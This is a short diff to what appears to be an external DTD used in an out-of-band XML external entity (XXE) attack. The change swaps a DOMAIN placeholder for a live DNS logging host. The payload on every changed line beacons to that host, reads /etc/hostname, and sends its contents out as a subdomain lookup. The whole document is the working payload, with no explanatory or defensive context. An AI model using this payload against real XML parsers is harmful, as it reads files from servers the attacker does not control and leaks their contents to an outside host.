@@ -1,7 +1,7 @@
-<!ENTITY % b "<!ENTITY &#x25; bb SYSTEM 'http://beacon.DOMAIN/'>">
+<!ENTITY % b "<!ENTITY &#x25; bb SYSTEM 'http://beacon.v1d1q9.dnslog.cn/'>">
 %b;
 %bb;
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://meow.%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://meow.%file;v1d1q9.dnslog.cn/'>">
 %eval;
 %exfil;
